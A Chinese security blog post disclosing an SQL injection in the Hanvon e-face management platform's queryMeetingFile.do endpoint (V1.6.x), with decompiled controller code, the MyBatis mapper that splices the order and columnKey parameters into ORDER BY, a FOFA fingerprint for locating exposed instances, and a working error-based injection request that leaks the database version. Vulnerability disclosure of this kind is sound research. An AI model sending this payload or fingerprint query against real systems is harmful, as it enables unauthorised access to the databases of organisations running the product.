---
title: "汉王e脸通综合管理平台 queryMeetingFile.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-queryMeetingFile-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-querymeetingfile.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 queryMeetingFile.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/9 08:36
- 856浏览
- [0评论](#comment)
- 27分钟阅读

深入探索

SQL

应用

软件

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理[软件](#)，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `queryMeetingFile.do` 接口存在 [SQL 注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入防护

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

深入探索

网络安全会议

文本剥离工具

安全研究工具

直接看 `MobiMeetingAppController` 里关于 `queryMeetingFile` 的实现

```
@ResponseBody
@RequestMapping(
    value = {"/queryMeetingFile.do"},
    method = {RequestMethod.GET}
)
public MethodResult queryMeetingFile(@RequestParam(required = true,value = "mtId") Long mtId, @RequestParam(required = false,value = "page") Integer page, @RequestParam(required = false,value = "pageSize") Integer pageSize, @RequestParam(required = false,value = "columnKey") String columnKey, @RequestParam(required = false,value = "order") String order, @RequestHeader(required = false,value = "token") String token) {
    new MethodResult();
    MethodResult rst = this.getTokenUser(token);
    if (rst.isSuccess()) {
        UserTpm user = (UserTpm)rst.getResult();

        MethodResult methodResult;
        try {
            if (page == null) {
                page = Constants.DEFAULT_START_PAGE_INDEX;
            }

            if (pageSize == null) {
                pageSize = Constants.PAGE_SIZE;
            }

            MeetingFileParam param = new MeetingFileParam();
            param.setMtId(mtId);
            param.setColumnKey(columnKey);
            param.setOrder(order);
            PageHelper.startPage(page, pageSize);
            List<MeetingFile> list = this.meetingAsm.queryMeetingFile(param);
```

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 MeetingFileDsm.xml

代码安全审计

```
<!--查询会议附件列表(按照会议ID查询)-->
  <select id="queryMeetingFile" parameterType="com.hanvon.iface.tpm.meeting.param.MeetingFileParam" resultMap="BaseResultMap">
    SELECT MMF.ID, MMF.MT_ID, MMF.MF_NAME, MMF.MF_FILE_PATH, MMF.MF_CREATE_TIME,MMF.MF_CREATE_ID
    FROM mt_meeting_file MMF
    WHERE MMF.MT_ID = #{mtId,jdbcType=BIGINT}
    ORDER BY
    <if test="order == null or order == ''">
      MMF.MF_CREATE_TIME desc
    </if>
    <if test="order != null and order != ''">
      ${columnKey} ${order}
    </if>
  </select>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

> 需要一个合法的 token，参考 [wxLogin.do 信息泄露](https://mrxn.net/jswz/hanvon-efacego-wxLogin-auth-bypass-data-leak.html "wxLogin.do 信息泄露")获取
>
> 需要 mtId 参数存在
>
> 漏洞修复方案

```
GET /manage/mobiMeetingApp/queryMeetingFile.do?begin=&branchId=1&end=&page=1&pageSize=10&year=2025&mtId=1&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(2920=2920,1)))),8357)) HTTP/1.1
Host: hanvon.mrxn.net
token: xxxxxxxxxxxxxxxx
```

[![汉王e脸通综合管理平台 queryMeetingFile.do SQL注入漏洞](images/img-001-ae0890338c94.webp)](https://image.mrxn.net/b550dcd431934f2ab9564fbc9db91f8e.webp)

成功利用报错注入获取到数据版本号

物流软件安全

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
